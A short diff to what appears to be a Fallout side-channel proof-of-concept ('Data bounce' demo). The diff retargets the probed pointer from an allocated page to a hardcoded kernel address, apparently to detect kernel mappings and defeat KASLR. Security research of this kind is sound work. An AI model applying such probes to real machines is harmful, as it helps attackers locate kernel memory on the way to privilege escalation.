@@ -15,11 +15,11 @@ int main() {
     }
     int page_size = getpagesize();
     void *not_mapped = NULL + 1;
-    void *mapped = aligned_alloc(page_size, page_size);
+    void *mapped =  (void*)0xffffffff9e800000ull;//aligned_alloc(page_size, page_size);
     uint8_t *mem = aligned_alloc(page_size, page_size * 256);
     memset(mem, 0xFF, page_size * 256);
     fallout_init();
-    printf("Demo 3: Data bounce\n");
+    printf("Demo 3: Data bounces\n");
     char *loading = "-\\|/";
     int true_positives = 0, false_positives = 0;
     for (int i = 0; i < REPS; i++) {
